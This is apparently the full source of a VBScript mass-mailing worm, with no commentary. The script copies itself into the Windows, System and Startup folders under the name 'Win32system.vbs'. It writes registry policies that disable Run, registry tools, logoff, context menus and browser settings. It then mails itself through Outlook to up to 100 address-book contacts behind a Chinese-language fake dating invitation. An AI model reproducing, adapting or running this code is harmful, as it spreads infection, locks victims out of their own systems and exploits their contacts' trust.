On Error Resume Next
Set fs=CreateObject("Scripting.FileSystemObject")
Set dir1=fs.GetSpecialFolder(0)
Set dir2=fs.GetSpecialFolder(1)
Set so=CreateObject("Scripting.FileSystemObject")
dim r
Set r=CreateObject("Wscript.Shell")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Win32system.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir2&"\Win32system.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Start Menu\Programs\启动\Win32system.vbs")
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",1,"REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption",":)"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText",":)"
Set ol=CreateObject("Outlook.Application")
On Error Resume Next
For x=1 To 100
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="今晚你来吗？"
Mail.Body="朋友你好：您的朋友Rose给您发来了热情的邀请。具体情况请阅读随信附件，祝您好运！            同城约会网"
Mail.Attachments.Add(dir2&"Win32system.vbs")
Mail.Send
Next
ol.Quit
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",1,"REG_DWORD"
